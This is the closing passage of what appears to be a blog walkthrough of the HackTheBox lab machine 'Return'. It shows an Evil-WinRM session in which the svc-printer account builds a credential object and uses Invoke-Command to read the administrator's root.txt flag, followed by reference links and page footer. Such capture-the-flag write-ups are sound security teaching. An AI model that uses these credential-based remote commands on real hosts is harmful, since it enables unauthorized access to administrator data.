</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\s</span>vc-printer<span class=se>\c</span>hrp&gt; <span class=nv>$cred</span> <span class=o>=</span> new-object -typename System.Management.Automation.PSCredential -argumentlist <span class=nv>$username</span>, <span class=nv>$password</span>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\s</span>vc-printer<span class=se>\c</span>hrp&gt; Invoke-Command -Computer localhost -Credential <span class=nv>$cred</span> -ScriptBlock <span class=o>{</span> gci C:/users/administrator/desktop/root.txt <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    Directory: C:<span class=se>\u</span>sers<span class=se>\a</span>dministrator<span class=se>\d</span>esktop
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Mode                LastWriteTime         Length Name                                                                                                 PSComputerName
</span></span><span class=line><span class=cl>----                -------------         ------ ----                                                                                                 --------------
</span></span><span class=line><span class=cl>-ar---       10/14/2021  10:33 PM             <span class=m>34</span> root.txt                                                                                             localhost
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\s</span>vc-printer<span class=se>\c</span>hrp&gt; Invoke-Command -Computer localhost -Credential <span class=nv>$cred</span> -ScriptBlock <span class=o>{</span> gc C:/users/administrator/desktop/root.txt <span class=o>}</span>
</span></span><span class=line><span class=cl>9f8dd...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span></code></pre></div><div class=post-references><h2>References</h2><ul><li><a href=https://ss64.com/nt/syntax-security_groups.html target=_blank rel="noopener noreferrer">https://ss64.com/nt/syntax-security_groups.html</a></li><li><a href=https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges target=_blank rel="noopener noreferrer">https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges</a></li><li><a href=https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/back-up-files-and-directories target=_blank rel="noopener noreferrer">https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/back-up-files-and-directories</a></li></ul></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://fahmifj.github.io/tags/windows/>Windows</a></li><li><a href=https://fahmifj.github.io/tags/active-directory/>Active-Directory</a></li><li><a href=https://fahmifj.github.io/tags/network-printer/>Network-printer</a></li><li><a href=https://fahmifj.github.io/tags/server-operators/>Server-operators</a></li><li><a href=https://fahmifj.github.io/tags/printnightmare/>PrintNightmare</a></li><li><a href=https://fahmifj.github.io/tags/acl/>ACL</a></li></ul><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Return on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20-%20Return&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2freturn%2f&hashtags=Windows%2cActive-Directory%2cNetwork-printer%2cServer-operators%2cPrintNightmare%2cACL"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Return on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2freturn%2f&title=HackTheBox%20-%20Return&summary=HackTheBox%20-%20Return&source=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2freturn%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Return on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2freturn%2f&title=HackTheBox%20-%20Return"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Return on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2freturn%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Return on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20-%20Return%20-%20https%3a%2f%2ffahmifj.github.io%2fhackthebox%2freturn%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Return on telegram" href="https://telegram.me/share/url?text=HackTheBox%20-%20Return&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2freturn%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></div></main><footer class=footer><span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a>&nbsp;&&nbsp;<a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>&nbsp;(mod)</span>
<span><span class=copyright>&copy; 2022&nbsp;<a href=https://fahmifj.github.io/about>Fahmi FJ</a></span>
&nbsp;·&nbsp;
<span class=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/>CC BY-NC-SA 4.0</a></span></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>let menu=document.getElementById("menu");menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>